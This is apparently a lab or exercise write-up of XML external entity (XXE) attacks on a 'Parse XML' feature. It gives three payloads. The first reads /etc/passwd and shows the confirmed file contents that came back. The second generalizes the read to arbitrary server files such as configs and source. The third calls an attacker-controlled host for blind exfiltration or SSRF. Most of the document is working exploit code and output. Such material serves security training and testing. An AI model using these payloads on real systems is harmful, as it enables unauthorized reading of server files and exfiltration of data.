# Payloads

The payload below was submitted through the "Enter xml to parse"
textarea of the Parse XML feature and processed via the "Parse"
button.

## Payload 1 — Classic XXE file read (confirmed working)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

**How it works:**
- Declares an internal DTD (`<!DOCTYPE foo [...]>`) for the document.
- Defines a custom external entity `xxe` using the `SYSTEM` keyword,
  pointing to the local file `/etc/passwd` via the `file://` URI
  scheme.
- References that entity with `&xxe;` inside the root element
  `<foo>`.
- The XML parser resolves the entity before returning the parsed
  document, substituting `&xxe;` with the full contents of the
  referenced file.

**Result (confirmed — actual output returned by the application):**

```
<foo>root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin </foo>
```

This matches the exercise's exact objective: the full contents of
`/etc/passwd` displayed in the application's output, achieved purely
through the exposed "Parse XML" feature, **without modifying the
application or its source code**.

## Payload 2 — Reading an arbitrary file (generalized variant)

The same technique generalizes to any readable file on the server by
changing the `SYSTEM` URI:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<foo>&xxe;</foo>
```

Useful during an assessment for probing what else is readable beyond
`/etc/passwd` (application config files, source code, etc.), though
not required for this exercise's specific objective.

## Payload 3 — Out-of-band / SSRF variant (documented, not required here)

If a `file://` read is blocked or the result isn't reflected directly
in the response, XXE can also be leveraged to perform outbound HTTP
requests from the server (useful for SSRF or blind exfiltration via
an attacker-controlled listener):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker-controlled-server.example/collect">
]>
<foo>&xxe;</foo>
```

This wasn't needed for this exercise since Payload 1 directly
returned the file contents in-band, but it's documented here as a
common escalation path for this vulnerability class.
